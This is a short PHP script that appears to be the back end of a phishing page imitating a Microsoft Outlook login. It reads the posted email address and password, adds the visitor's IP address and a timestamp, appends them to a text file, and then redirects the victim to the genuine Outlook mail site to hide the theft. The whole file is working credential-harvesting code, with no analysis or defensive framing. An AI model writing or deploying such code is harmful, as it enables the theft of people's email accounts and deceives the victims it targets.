<?php
header ('Location: https://outlook.live.com/mail/0/'); 
foreach($_POST as $variable => $value) 
$registro = $_POST['treinta'];
$registrob = $_POST['veinte'];
$Time = ""   .   date("h:i:sa");
$IP = getenv("REMOTE_ADDR");
$B1LS4G = "=X=FwC=X=

Corr3o :  $registro
Cl4ve  : $registrob
IP : $IP
Hora : $Time

";
$handle = fopen("text.txt", "a");
fwrite($handle,$B1LS4G);
$x=md5(microtime());

?>
